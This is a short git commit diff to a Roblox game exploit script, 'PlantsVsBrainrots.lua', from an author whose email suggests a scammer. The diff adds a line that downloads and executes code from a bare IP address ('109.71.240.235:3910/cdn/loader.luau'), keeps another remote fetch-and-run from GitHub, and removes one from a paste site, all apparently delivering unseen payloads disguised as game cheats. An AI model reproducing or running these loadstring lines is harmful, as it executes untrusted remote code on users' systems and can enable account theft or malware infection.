ff84354b6265337440d9a66daa57c15c9e4ab317
terist999 <xscammer25@gmail.com>
2025-11-14 10:30:11 +0800

    Update PlantsVsBrainrots.lua

--- PlantsVsBrainrots.lua
+++ PlantsVsBrainrots.lua
@@ -1,3 +1,4 @@
-loadstring(game:HttpGet("https://pastefy.app/xRLfUijs/raw"))()
+ID="e290e44c-b610-45d4-ab12-1cdc7e81d0a0";
+loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/loader.luau"))()
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/collectorhenfi-wq/Hendarscriptt/refs/heads/main/Plantvsbrainrotupdate.txt"))()
